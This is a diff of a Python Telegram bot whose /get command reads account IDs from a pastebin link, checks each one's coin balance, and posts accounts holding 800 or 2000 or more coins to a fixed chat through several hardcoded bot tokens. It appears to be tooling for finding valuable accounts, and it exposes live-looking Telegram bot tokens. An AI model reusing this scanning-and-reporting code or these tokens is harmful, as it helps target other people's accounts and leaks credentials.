@@ -11,19 +11,19 @@ bot = telebot.TeleBot(BOT_TOKEN)
 server = Flask(__name__)
 logger = telebot.logger
 logger.setLevel(logging.DEBUG)
-import telebot, requests
-bot = telebot.TeleBot("1132931143:AAGwzukJusNzc5XjSvIMS92X8qLtGo9_Im4")
 @bot.message_handler(commands=['get'])
 def getID(message):
     numCH = 0
-    pastebin = (message.text).replace("/get", "")
+    pastebin = (message.text.split(":")[0]).replace("/get", "")
+    num = int(message.text.split(":")[1])
     idS = requests.get(str(pastebin)).text.splitlines()
     mas = types.InlineKeyboardMarkup(row_width=2)
     z = types.InlineKeyboardButton(f'ID : 000000000', callback_data="1x")
     m = types.InlineKeyboardButton(f'CHECK : {str(numCH)}', callback_data="1x")
     mas.add(z,m)
     sendM = bot.send_message(message.chat.id, f'- LOADING .....\nPastebin : {pastebin}', reply_markup=mas)
-    for fil in idS:
+    while True:
+        fil = idS[num]
         mas = types.InlineKeyboardMarkup(row_width=2)
         z = types.InlineKeyboardButton(f'ID : {fil}', callback_data="1x")
         m = types.InlineKeyboardButton(f'CHECK : {str(numCH)}', callback_data="1x")
@@ -53,11 +53,13 @@ def getID(message):
             coins = str(coin.split('"')[0])
             requests.get(f'''https://api.telegram.org/bot1111603340:AAHuKvMBE6z5Sk1rQ_jl-yWi12UVcjBU91U/sendMessage?chat_id=420953620&text=✅ Have coins {coins} ==> {fil}''')
             numCH +=1
+            num +=1
             if int(coins) > 800 or int(coins) == 800:
                 requests.get( f'''https://api.telegram.org/bot1166194091:AAEEDj7xjmgTt3ipvXTycCK44280OJflUaA/sendMessage?chat_id=420953620&text=✅ Have coins {coins} ==> {fil}''')
                 if int(coins) > 2000 or int(coins) == 2000:
                     requests.get( f'''https://api.telegram.org/bot5208965780:AAHhLQrfv_7-LybUzRxt3_heQV13JocX0eY/sendMessage?chat_id=420953620&text=✅ Have coins {coins} ==> {fil}''')
         else:
+            num += 1
             numCH += 1
 
 @server.route(f"/{BOT_TOKEN}", methods=["POST"])
